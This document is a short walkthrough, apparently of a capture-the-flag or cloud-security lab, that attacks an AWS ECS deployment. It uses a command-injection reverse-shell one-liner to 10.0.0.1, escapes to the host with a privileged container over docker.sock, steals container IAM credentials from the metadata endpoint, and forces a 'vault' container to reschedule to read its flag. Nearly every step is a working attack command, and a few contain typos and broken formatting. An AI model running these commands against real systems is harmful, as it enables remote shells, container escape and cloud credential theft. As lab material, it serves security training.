1. Exploit the website via command injection.

    ```bash
    ; export RHOST="10.0.0.1";export RPORT=4242;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
    ```

2. Use the docker.sock to deploy a new container 

    `docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host`

3. List the container on the host

    `docker ps`

4. Get the container credentials from the "privd" container. 

    ```bash
        docker exec -it <container_id> sh 
        wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI `
    ``
5. List the clusters in the account 

    `aws ecs list-clusters --profile privd`

6. List tasks in the cluster

    `aws ecs list-tasks --cluster my-cluster --profile privd`

7. List container instances 

    `aws ecs list-container-instances --cluster my-cluster --profile privd `

8. Set container instance to DRANING 

    `aws ecs update-container-instances-state --cluster my-cluster --container-instances <> --status DRAINING`

9. Wait for "Vault" container to be rescheduled. 

    `docker ps`

10. Get the flag from the "vault" container 

    `docker exec -it <container_id> cat /FLAG.txt`